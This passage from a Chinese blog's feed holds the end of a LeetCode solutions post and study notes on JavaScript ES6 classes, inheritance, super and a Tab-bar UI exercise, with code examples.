title="思路&amp;题解"></a>思路&amp;题解</h3><p>好像是比较简便的方法了，但是最后输出时完全可以这样：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">Object</span>.values(map);*</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-61——扑克牌中的顺子（☆）（★）"><a href="#剑指-Offer-61——扑克牌中的顺子（☆）（★）" class="headerlink" title="剑指 Offer 61——扑克牌中的顺子（☆）（★）"></a>剑指 Offer 61——扑克牌中的顺子（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/bu-ke-pai-zhong-de-shun-zi-lcof/">跳转地址</a></p><h3 id="思路-amp-题解-37"><a href="#思路-amp-题解-37" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isStraight = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">let</span> [min, max] = [<span class="number">14</span>, <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">of</span> nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (num === <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (set.has(num)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        set.add(num);</span><br><span class="line">        max = <span class="built_in">Math</span>.max(max, num);</span><br><span class="line">        min = <span class="built_in">Math</span>.min(min, num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max - min &lt; <span class="number">5</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/10/14/FhG1sJ8bnKCSRXP.png&quot; alt=&quot;数据结构副本.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言</summary>
      
    
    
    
    <category term="数据结构" scheme="https://asura1211.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数组" scheme="https://asura1211.github.io/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>【阅读笔记】— — pink老师js进阶</title>
    <link href="https://asura1211.github.io/2021/06/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20pink%E8%80%81%E5%B8%88js%E8%BF%9B%E9%98%B6/"/>
    <id>https://asura1211.github.io/2021/06/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20pink%E8%80%81%E5%B8%88js%E8%BF%9B%E9%98%B6/</id>
    <published>2021-06-06T11:04:07.000Z</published>
    <updated>2021-07-01T13:11:45.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是我在跟学<a href="https://www.bilibili.com/video/BV1Kt411w7MP">B站javascript视频</a>过程中所做的笔记，也是为了后续更好的复习（这知识过一遍它不进脑子哇~）</p><p>部分内容参考自<a href="https://taylor12138.gitee.io/">https://taylor12138.gitee.io/</a></p><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="ES6中的类和对象"><a href="#ES6中的类和对象" class="headerlink" title="ES6中的类和对象"></a>ES6中的类和对象</h2><blockquote><p>在 JavaScript中，对象是一组无序的相关属性和方法的集合，所有的事物都是对象，例如字符串、数值、数组、函数等。</p></blockquote><h3 id="class类"><a href="#class类" class="headerlink" title="class类"></a>class类</h3><p>在ES6中新增加了类的概念，可以使用 class关键字声明一个类，之后以这个类来实例化对象。</p><p><strong>类</strong>抽象了对象的公共部分，它泛指某大类（class），而 <strong>对象</strong>特指某一个。通过类实例化<strong>一个具体</strong>的对象</p><p>面向对象的思维特点：</p><ol><li>抽取（抽象）对象共用的属性和行为组织（封装）成一个<strong>类</strong>（模板</li><li>对类进行实例化获取类的<strong>对象</strong></li></ol><h3 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h3><p>语法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name</span></span>&#123;</span><br><span class="line">  <span class="comment">// class body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建实例：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> name()</span><br></pre></td></tr></table></figure><h3 id="constructor-构造函数"><a href="#constructor-构造函数" class="headerlink" title="constructor 构造函数"></a>constructor 构造函数</h3><p><strong>constructor()<strong>方法是类的构造函数（默认方法），</strong>用于传递参数返回实例对象</strong>。通过<strong>new命令</strong>生成对象实例时，自动调用该方法。如果没有显示定义,类内部会自动给我们创建一个 **constructor()**。</p><h3 id="创建第一个类和对象"><a href="#创建第一个类和对象" class="headerlink" title="创建第一个类和对象"></a>创建第一个类和对象</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.创建类 class 创建一个明显类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">uname, age</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname <span class="comment">//this 指向创建的实例  this=&gt;ldh</span></span><br><span class="line">    <span class="built_in">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.利用类创建对象</span></span><br><span class="line"><span class="keyword">let</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;刘德华&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="keyword">let</span> zxy = <span class="keyword">new</span> Star(<span class="string">&#x27;张学友&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ldh); <span class="comment">//  &#123;uname: &quot;刘德华&quot;, age: 18&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(zxy); <span class="comment">//  &#123;uname: &quot;张学友&quot;, age: 20&#125;</span></span><br></pre></td></tr></table></figure><p>注意事项：</p><ol><li>通过class 关键字创建类, 类名我们还是习惯性定义<strong>首字母大写</strong></li><li>类里面有个constructor 函数,可以<strong>接受</strong>传递过来的<strong>参数</strong>,同时<strong>返回实例对象</strong></li><li>constructor 函数 只要 new 生成实例时,就会<strong>自动调用</strong>这个函数,如果我们不写这个函数,类也会<strong>自动生成</strong>这个<strong>函数</strong></li><li>生成实例 <strong>new</strong> 不能省略</li><li>最后注意语法规范, 创建类时 <strong>类名</strong>后面<strong>不要加小括号</strong>,生成实例时 类名后面<strong>加小括号</strong>, <strong>构造函数不需要加 function</strong></li></ol><h3 id="类中添加方法"><a href="#类中添加方法" class="headerlink" title="类中添加方法"></a>类中添加方法</h3><p>注意事项：</p><ol><li>类里边<strong>所有函数不需要写 function 关键字</strong></li><li>多个函数或者方法之间<strong>不需要加</strong> <strong>(逗号)</strong></li></ol><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.创建类 class 创建一个明显类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">uname, age</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname <span class="comment">//this 指向创建的实例  this=&gt;ldh</span></span><br><span class="line">    <span class="built_in">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">sing</span>(<span class="params">song</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.uname + <span class="string">&#x27;唱&#x27;</span> + song)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.利用类创建对象</span></span><br><span class="line"><span class="keyword">let</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;刘德华&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="keyword">let</span> zxy = <span class="keyword">new</span> Star(<span class="string">&#x27;张学友&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ldh); <span class="comment">//  &#123;uname: &quot;刘德华&quot;, age: 18&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(zxy); <span class="comment">//  &#123;uname: &quot;张学友&quot;, age: 20&#125;</span></span><br><span class="line"></span><br><span class="line">ldh.sing(<span class="string">&#x27;冰雨&#x27;</span>) <span class="comment">//刘德华唱冰雨</span></span><br><span class="line">zxy.sing(<span class="string">&#x27;李香兰&#x27;</span>) <span class="comment">//张学友唱李香兰</span></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li>在Es6中类<strong>没有变量提升</strong>，所以必须先<strong>定义类</strong>，<strong>才能</strong>通过类<strong>实例化</strong>对象</li><li>类里面共有的属性和方法<strong>一定要加this使用</strong></li><li>类里边的this指向问题<ul><li><strong>constructor里面的this指向实例对象</strong></li><li><strong>方法里面的this指向这个方法的调用者</strong></li></ul></li></ol><h3 id="this指向问题案例"><a href="#this指向问题案例" class="headerlink" title="this指向问题案例"></a><strong>this指向问题案例</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> that;</span><br><span class="line"><span class="keyword">var</span> _that;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Star</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">uname, age</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// constructor 里面的this 指向的是 创建的实例对象</span></span><br><span class="line">        that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.uname = uname;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="comment">// this.sing();</span></span><br><span class="line">        <span class="built_in">this</span>.btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.btn.onclick = <span class="built_in">this</span>.sing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">sing</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 这个sing方法里面的this 指向的是 btn 这个按钮,因为这个按钮调用了这个函数</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(that.uname); <span class="comment">// that.uname刘德华 that里面存储的是constructor里面的this  </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">dance</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 这个dance里面的this 指向的是实例对象 ldh 因为ldh 调用了这个函数</span></span><br><span class="line">        _that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>); <span class="comment">//Star &#123;uname: &quot;刘德华&quot;, age: undefined, btn: button&#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ldh = <span class="keyword">new</span> Star(<span class="string">&#x27;刘德华&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(that === ldh); <span class="comment">//true</span></span><br><span class="line">ldh.dance();</span><br><span class="line"><span class="built_in">console</span>.log(_that === ldh); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><blockquote><p>继承中，如果实例化子类输出一个方法，先看子类有没有这个方法，如果有就先执行子类的方法，如果子类里面没有，就去查找父类有没有这个方法，如果有，就执行父类的这个方法（就近原 则）</p></blockquote><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line"><span class="comment">//父类</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line"><span class="comment">//子类继承父类</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.类的继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">money</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line">son.money()  <span class="comment">//100</span></span><br></pre></td></tr></table></figure><h3 id="super-超级的-关键字"><a href="#super-超级的-关键字" class="headerlink" title="super(超级的) 关键字"></a>super(超级的) 关键字</h3><p><strong>super</strong>关键字用于访问和调用对象父类上的函数。可以<strong>调用</strong>父类的<strong>构造函数</strong>，<strong>也可以调用</strong>父类的<strong>普通函数</strong></p><p>示例：调用<strong>构造函数</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x</span><br><span class="line">    <span class="built_in">this</span>.y = y</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">sum</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x + <span class="built_in">this</span>.y)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 这里不能访问父类的 this,父类的sum函数中的this是父类的，子类值没有传递进去</span></span><br><span class="line">    <span class="comment">// this.x = x // 报错</span></span><br><span class="line">    <span class="comment">// this.y = y // 报错</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>(x,y);<span class="comment">//调用父类中的构造函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">son.sum() <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>示例：调用<strong>普通函数</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// super调用父类的普通函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">say</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;我是爸爸&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">say</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">   <span class="comment">//调用父类的普通方法</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">super</span>.say()); <span class="comment">//我是爸爸</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br></pre></td></tr></table></figure><h3 id="继承方法的同时扩展方法"><a href="#继承方法的同时扩展方法" class="headerlink" title="继承方法的同时扩展方法"></a>继承方法的同时扩展方法</h3><p>需求：继承父类的加法方法的同时，自己扩展一个减法方法。</p><p>注意事项：<strong>调用父类的函数时</strong>，super必须在子类this之前调用(<strong>父亲必须放在之前</strong>)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类加法操作</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x</span><br><span class="line">    <span class="built_in">this</span>.y = y</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">sum</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x + <span class="built_in">this</span>.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 子类继承父类加法方法的同时扩展减法操作</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用父类的构造函数 super必须在子类this之前调用(父亲必须放在之前)</span></span><br><span class="line">    <span class="built_in">super</span>(x, y)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.x = x</span><br><span class="line">    <span class="built_in">this</span>.y = y</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">subtract</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x - <span class="built_in">this</span>.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">son.subtract() <span class="comment">// 2</span></span><br><span class="line">son.sum() <span class="comment">// 8</span></span><br></pre></td></tr></table></figure><h2 id="Tab栏-案例"><a href="#Tab栏-案例" class="headerlink" title="Tab栏 案例"></a>Tab栏 案例</h2><p>功能描述：</p><ol><li>点击Tab栏能实现<strong>切换</strong></li><li>Tab栏和内容 点击右上角×号能<strong>删除</strong>当前<strong>栏目和内容</strong></li><li>点击加号能实现<strong>增加Tab栏</strong>功能</li><li><strong>双击Tab栏</strong>，可以<strong>编辑Tab栏名称</strong></li><li><strong>双击内容</strong>，可<strong>编辑内容</strong></li></ol><h3 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a>模块划分</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tab</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取元素</span></span><br><span class="line">        <span class="built_in">this</span>.main = <span class="built_in">document</span>.querySelector(id);</span><br><span class="line">        <span class="built_in">this</span>.lis = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.sections = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;section&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// init 初始化操作让相关的元素绑定事件</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">            <span class="comment">//方法后面不能加（），否则直接调用</span></span><br><span class="line">            <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab;</span><br><span class="line">            <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab;</span><br><span class="line">            <span class="built_in">this</span>.spans[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">            <span class="built_in">this</span>.sections[i].ondblclick = <span class="built_in">this</span>.editTab;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 1. 切换功能</span></span><br><span class="line">    <span class="function"><span class="title">toggleTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 2. 添加功能</span></span><br><span class="line">    <span class="function"><span class="title">addTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 3. 删除功能</span></span><br><span class="line">    <span class="function"><span class="title">removeTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// 4. 修改功能</span></span><br><span class="line">    <span class="function"><span class="title">editTab</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Tab(<span class="string">&#x27;#tab&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="点击Tab栏能实现切换-Tab栏和内容"><a href="#点击Tab栏能实现切换-Tab栏和内容" class="headerlink" title="点击Tab栏能实现切换 Tab栏和内容"></a>点击Tab栏能实现切换 Tab栏和内容</h3><p><img src="https://i.loli.net/2021/06/06/Wi6KfSmcpPLqTJC.gif" alt="切换tab页.gif"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 切换功能</span></span><br><span class="line"><span class="function"><span class="title">toggleTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 通过var that = this 保存最初调用的this指向</span></span><br><span class="line">    that.clearClass();</span><br><span class="line">    <span class="built_in">this</span>.className = <span class="string">&#x27;liactive&#x27;</span>;</span><br><span class="line">    that.sections[<span class="built_in">this</span>.index].className = <span class="string">&#x27;conactive&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 清除所有li 和section 的类</span></span><br><span class="line"><span class="function"><span class="title">clearClass</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="built_in">this</span>.sections[i].className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="点击加号能实现增加Tab栏效果"><a href="#点击加号能实现增加Tab栏效果" class="headerlink" title="点击加号能实现增加Tab栏效果"></a>点击加号能实现增加Tab栏效果</h3><p><img src="https://i.loli.net/2021/06/06/ROI3PrLAwiGjCKp.gif" alt="新增tab页.gif"></p><blockquote><p>如下代码都为在原来的基础上新增</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取元素</span></span><br><span class="line">    <span class="built_in">this</span>.add = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabadd&#x27;</span>);</span><br><span class="line">    <span class="comment">// li的父元素</span></span><br><span class="line">    <span class="built_in">this</span>.ul = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.fisrstnav ul:first-child&#x27;</span>);</span><br><span class="line">    <span class="comment">// section 父元素</span></span><br><span class="line">    <span class="built_in">this</span>.fsection = <span class="built_in">this</span>.main.querySelector(<span class="string">&#x27;.tabscon&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.updateNode();</span><br><span class="line">    <span class="comment">// init 初始化操作让相关的元素绑定事件</span></span><br><span class="line">    <span class="built_in">this</span>.add.onclick = <span class="built_in">this</span>.addTab;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为我们动态添加元素 所以需要重新获取对应的元素 这样就不会出现点击新增tab没有相应事件的bug</span></span><br><span class="line"><span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.lis = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.sections = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;section&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2. 添加功能</span></span><br><span class="line"><span class="function"><span class="title">addTab</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    that.clearClass();</span><br><span class="line">    <span class="comment">// (1) 创建li元素和section元素 </span></span><br><span class="line">    <span class="keyword">var</span> random = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> li = <span class="string">&#x27;&lt;li class=&quot;liactive&quot;&gt;&lt;span&gt;新选项卡&lt;/span&gt;&lt;span class=&quot;iconfont icon-guanbi&quot;&gt;&lt;/span&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> section = <span class="string">&#x27;&lt;section class=&quot;conactive&quot;&gt;测试 &#x27;</span> + random + <span class="string">&#x27;&lt;/section&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">// (2) 把这两个元素追加到对应的父元素里面</span></span><br><span class="line">    that.ul.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, li);</span><br><span class="line">    that.fsection.insertAdjacentHTML(<span class="string">&#x27;beforeend&#x27;</span>, section);</span><br><span class="line">    <span class="comment">// (3)最后初始化，重新获取节点</span></span><br><span class="line">    that.init(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="点击右上角×号能删除当前栏目和内容"><a href="#点击右上角×号能删除当前栏目和内容" class="headerlink" title="点击右上角×号能删除当前栏目和内容"></a>点击右上角×号能删除当前栏目和内容</h3><p><img src="https://i.loli.net/2021/06/06/cRVQv5kJtOYoz73.gif" alt="删除tab页.gif"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">           <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="title">updateNode</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">   <span class="comment">//删除时也是动态添加元素了，所以需要重新获取</span></span><br><span class="line">       <span class="built_in">this</span>.remove = <span class="built_in">this</span>.main.querySelectorAll(<span class="string">&#x27;.icon-guanbi&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 3. 删除功能</span></span><br><span class="line">   <span class="function"><span class="title">removeTab</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">       <span class="comment">// 阻止冒泡 防止触发li 的切换点击事件！</span></span><br><span class="line">       e.stopPropagation(); </span><br><span class="line">       <span class="comment">//x没有索引号，但是可以拿到父亲的索引</span></span><br><span class="line">       <span class="keyword">var</span> index = <span class="built_in">this</span>.parentNode.index;</span><br><span class="line">       <span class="comment">// 根据索引号删除对应的li 和section   remove()方法可以直接删除指定的元素</span></span><br><span class="line">       that.lis[index].remove();</span><br><span class="line">       that.sections[index].remove();</span><br><span class="line">       <span class="comment">//删除完后重新获取节点数目</span></span><br><span class="line">       that.init();</span><br><span class="line">       <span class="comment">// 当我们删除的不是选中状态的li 的时候,原来的选中状态li保持不变(即不执行index--后面代码)</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">document</span>.querySelector(<span class="string">&#x27;.liactive&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line">       <span class="comment">// 当我们删除了选中状态的这个li 的时候, 让它的前一个li 处于选定状态</span></span><br><span class="line">       index--;</span><br><span class="line">       <span class="comment">// 手动调用我们的点击事件(即切换active)  不需要鼠标触发</span></span><br><span class="line">       <span class="comment">//删除最后一个tag时，会报错，因为索引为-1的没有点击事件 that.lis[index].click(); 先判断前面是否为真</span></span><br><span class="line">       that.lis[index] &amp;&amp; that.lis[index].click();</span><br><span class="line">   